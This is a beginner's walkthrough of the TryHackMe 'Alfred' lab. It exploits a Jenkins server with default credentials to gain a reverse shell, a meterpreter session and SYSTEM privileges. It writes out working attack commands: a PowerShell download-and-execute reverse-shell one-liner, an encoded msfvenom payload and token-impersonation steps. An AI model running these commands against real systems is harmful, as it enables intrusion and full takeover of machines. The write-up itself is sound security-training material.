## Alfred - TryHackme's Room Writeup

This is my first attempt at creating a writup, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attemps of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it ceirtanly helped me to practice some tools and approaches. As I'm still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I'm learning, beware of the blog.


[Task 1] - Getting Initial Access
--------------------------

For this room it seems we'll need **Nishang** in order to gain access to the machine by using **_reverse shell scripts_**.

So lets start by listing the links to get this **Nishang** tool:

 - **Nishang**: [Click here](https://github.com/samratashok/nishang) to access the repository and get this Powershell toolset.
 - **Alfred Room on THM**: [Click here](https://tryhackme.com/room/alfred) to visit this room on TryHackme platform.

Ok once you have that tool downloaded to your system we can get started. Let's go question by question as designed for this THM box.

> Question #1: How many ports are open?

Ok so for this question we'll run **Nmap** to enumerate any open ports. It is importan to note that the room description mentions this machine **won't respond to ping (ICMP)** requests. So we'll need to add switch to deal with that when running our scan.

```shell
sudo nmap -A -Pn -p- 10.10.177.5

```
We'll use the switch/flag **-Pn** to avoid **Nmap** doing a ping before starting the scans. Also we use **-p-** to scan for all the ports  instead of the most common ones.

Once we get our results back we'll now the response for the first question. *Scanning all ports might take a while.*

```bash

```
Ok, so based on these results we now know how many ports are open.

> Question #2: What is the username and password for the log in panel(in the format username:password)?

Ok let's start by seeing what is being served in the port **80** of this machine.

![enter image description here](https://i.imgur.com/FK0zWJh.png)
Ok so we get an email _**ï»¿alfred@wayneenterprises.com**_, and a picture. Let's see if we get any other useful information by inspecting the **DOM**.

It seems there is not much info lying around the code of the page. It is always worth checking anyway.

The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let's download it.

At this point we would need a **passphrase ** if we want to attempt to extract any possibly hidden data in from this image. Since we don't have any piece of info so far that could act as a passphrase. We'll move forward from this for now. Also we are not even sure if this image has had any **steganography** job done.

I would be wise to start scanning for some other directories we might be able to access. Let's use GoBuster.

let's start a GoBuster scan with a small list first and see how it goes.

```bash
gobuster dir -u http://10.10.177.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

This might also take some time to run, but once it finishes we should have a better idea if there are any common directories that we can access.

This is what the GoBuster scan in progress looks like:

```bash

Progress: 11841 / 87665 (13.51%)

```
While we wait for GoBuster to try to find any directories. Let's take a look at what we have at port **8080**.

![port 8080 login page](https://i.imgur.com/oLuheqV.png)
Ok so we get a login form, we might as well try out some basic user:password combinations to see if maybe the security has overlooked something that basic.

We can go with the basic **admin:1234**, **admin:password**, **admin:admin**, etc.

Look at that, using **admin:admin** to log in has granted us access to Jenkins.

If a super weak password was not available, I'd probably try to force my way through this login form using **Burp's Intruder** or **hydra** with the **rockyou.txt** wordlist.

![Jenkins admin panel](https://i.imgur.com/kzHXdI4.png)
So that gives us the answer to Question #2.

Let's move to the next objective.

> Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: **_powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_**

Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let's take a look at what can we do in our Jenkins admin panel.

If we take a look at the existing jobs in the server, we see this job called **project** which was last run months ago, but it also ran successfully.

![Running Job on the server](https://i.imgur.com/cilmo5K.png)
Let's click on the job name to see what else we got here.

![Job details page](https://i.imgur.com/9IRIUNm.png)
If we click the **configure** button on this dashboard. We get the specific details of what this job does. Let's scroll down to the **Build** to see some more info.

![Job build command](https://i.imgur.com/T86ylyd.png)
So this job only runs a **whoami** command. I figure we can just use this section to place our exploitation command as suggested by the room's hint.

Ok, so the idea is this, we'll locally create a **Python3 HTTP Server** to serve the PowerShell script we get from **Nishang**  and we add the command to retrieve that script from our local sever into the Jenkin's Job build command.

Ok so looking at **Nishang's** folder we see that we have all scripts categorized. We'll be attempting to get a reverse shell, so let's look inside **/nishang/Shells/** 

From the room's hint we already know we are looking for, **Invoke-PowerShellTcp.ps1**

So let's get this file shared in our local HTTP server.
We navigate to the **Shells** folder and fire up our server like this:

```bash
sudo python3 -m http.server
```
We should see something like this:
```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
So our server is ready. Let's get that command set on the Jenkins job next.

Ok, let's review the command. We need to make some adjustments before we paste it into Jenkins.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

We need to change the **IP and Port**  and also make sure we specify a port value for our reverse shell. So this full command would attempt to connect to our local server to get the PS script and then open a reverse shell on a specific port to connect to our local listener(we'll do that in a bit).

> **Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run _ip add_ command to see your IP.**


In my case the command will look like this:  
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.0.34:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.0.34 -Port 6666
```

We have the command ready, we are just missing one tiny crucial part. We need to open a local listener on port 666 so our exploit can successfully open a reverse shell. Let's do that. 

In a terminal window start a **netcat** listener on port **6666**.

```bash
sudo nc -lvp 6666
listening on [any] 6666 ...
```
That's done, now to paste our full command into the Jenkins Job Build command section.


![We enter our exploit command](https://i.imgur.com/aWPWDUy.png)
After we enter the command, we click on **Save** button to save the changes.

Then we go back to the main project details page.
Let's trigger a new build by clicking on **Build Now** button so we see if your command runs fine.

![Build Now button](https://i.imgur.com/2RYq1y7.png)

We see a new build has been queued:

![our basic HTTP server works](https://i.imgur.com/blngU7y.png)
We see that our local server has received a request to serve a file, this seems to be working fine so far:

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.177.5 - - [16/Aug/2020 16:58:25] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
Let's see if something happened in our listener:

```bash
listening on [any] 6666 ...
10.10.177.5: inverse host lookup failed: Unknown host
connect to [10.13.0.34] from (UNKNOWN) [10.10.177.5] 49204
Windows PowerShell running as user bruce on ALFRED

PS C:\Program Files (x86)\Jenkins\workspace\project>

```

We got a reverse shell successfully!

so let's explore the machine a bit. If we type **dir c:/** we'll navigate to the root folder. From here we can go up into the Users folder to see what we got. We see a **bruce** user there. We can review each folder but for the sake of not making this write-up eternal Let's see what's inside the **bruce/Desktop/** folder.

```bash

Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019   3:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> type user.txt
{and-we-finally-get-the-flag-value}

```
Well, we made it this far. We were able to exploit a Jenkins project/job and we managed to get a reverse shell successfully. With this we can mark Question #3 as completed and we can  also answer the question number 4.

> As it turns out we didn't need any **GoBuster** scans. They returned nothing useful anyways. However, we still we managed to get the initial access and it never hurts to do some extra enumeration.

 [Task 2] - Switching shells
 --------------------------

In this section we'll see how to leverage **meterpreter** to aid our privilege escalation attempts.

In this section there is not much to add, as the room really provides almost all you need to answer the only question asked:

> Question: What is the final size of the exe payload that you generated?

Ok so we'll be using **msfvenom** to generate a payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

We need to replace **[IP], [PORT] and [SHELL NAME]**

For the sake of simplicity we'll bake this payload on the same **Shells** folder where we started our local server already.

In my case the final **msfvenom** command looks like this:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.0.34 LPORT=6555 -f exe -o payload.exe
```

After running that command we get the following back:

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.0.34 LPORT=6555 -f exe -o payload.exe
[sudo] password for kali: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: {ANSWER} bytes
Saved as: payload.exe
```
The rest of the plan follows the same approach we already did for  [Part 1]. We'll create a new PowerShell command to be added to the Jenkins job but this time we don't need the PS script as we'll be using the **payload.exe** that we just generated so the command varies a bit.

In my case that command would look like this:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.0.34:8000/payload.exe','payload.exe')"
```

We'll also need to setup a **multi handler** in **metasploit** to listen for our **payload.exe** reverse shell connection.

In our terminal let's start **msfconsole** to fire up **metasploit** and create our listener.

```bash
$ msfconsole
                                                  
# cowsay++

       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.101-dev                         ]

+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 > 

```
Here you can type **search multi handler** to locate the exploit we need and **show payloads** to select the right payload for it. For simplicity these are the right ones to use as instructed by the room itself:

```bash
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > 
```
Then we select the right payload:
```bash
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > 
```
Now you can type in **show options** to see which options are required for us to set, in order to run the exploit.

```bash
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```

As we can see, we just need to set **[LHOST]** and **[LPORT]** to the right values, let's do that.  And type in **exploit** or **run** to start our **metasploit listener/handler**.

> Make sure to set the **[LPORT]** to the port you specified when creating the **payload.exe** with **msfvenom**.


```bash
msf5 exploit(multi/handler) > set LHOST 10.13.0.34
LHOST => 10.13.0.34
msf5 exploit(multi/handler) > set LPORT 6555
LPORT => 6555
msf5 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.13.0.34:6555 
```
Now let's update that Jenkins Job build command with our payload. 

![we paste our new PS command to load our new payload](https://i.imgur.com/varPI6i.png)
Save the changes and again, trigger a new build as we did before. But unlike the previous deployed build in this case the exploit will just upload our payload to the server and we'll use our existing reverse shell from [Task 1] to execute it.

```powershell
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>dir


Directory: C:\Program Files (x86)\Jenkins\workspace\project


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         8/16/2020   3:17 PM      73802 payload.exe     
```

We can see our payload got uploaded correctly. Let's run it now.

```powershell
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>Start-Process "payload.exe"   
```

Once our payload runs, we see our **meterpreter** session gets created:

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.13.0.34:6555 
[*] Sending stage (176195 bytes) to 10.10.177.5
[*] Meterpreter session 1 opened (10.13.0.34:6555 -> 10.10.177.5:49213) at 2020-08-16 18:32:18 -0400

meterpreter > 

```

We successfully switched from a basic shell to a **meterpreter** shell. This concludes [Task 2].

 [Task 3] - Privilege Escalation
 --------------------------
 To solve this last task we'll have to leverage the **token impersonation** technique. The room itself goes into a bit of detail of what it is and how it works. Let's just skip to how to exploit it before this write-up gets any longer.

We need to use the **whoami /priv** command to see the permissions we have for the user **bruce**. Let's run that command in our reverse shell.

```bash
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv

PRIVILEGES INFORMATION

We get that **SeDebugPrivilege** and **SeImpersonatePrivilege** are **Enabled.** Just what we need.
```bash
SeDebugPrivilege                Debug programs                            Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
```

Back to our **meterpreter** reverse shell, let's load the **incognito** module that would let us exploit those privileges. Then we run **list_tokens -g** to see the available tokens.

```bash
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g

[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > 
```

Once the impersonation is done we type another command to get the UID:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
As we can see we successfully managed to impersonate **NT AUTHORITY\SYSTEM**.


Now we can answer the room's question:

> Question #3: What is the output when you run the _getuid_ command?

Even though we managed to impersonate successfully, this actually won't allow us to fully have the permissions of a privileged  user. So, we need to fix that. 

We can try to migrate our process to any other that is running with higher privileges, for that we'll use the **ps** command to get the list of running processes and identify one that suits our needs and finally **migrate PID** to migrate to such process.

```bash
meterpreter > ps

```

The room itself recommends us to use **services.exe** process:

```bash
668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe

```

The first numeric value corresponds to the **PID** process ID. So let's migrate!

```bash
meterpreter > migrate 668
[*] Migrating from 2664 to 668...
[*] Migration completed successfully.
meterpreter > 
```
Yay! we did it, we migrated to a privileged process successfully.

Let's see what is the last question or objective of this room

> Question #5: **read the root.txt file at C:\Windows\System32\config**

```bash
meterpreter > shell
Process 2728 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>type root.txt
type root.txt
{THIS IS THE FLAG VALUE}

C:\Windows\System32\config>

```
And that's all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I'm sure there is some other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove appealing to other noob-level ethical hackers out there.

As usual, happy hacking.
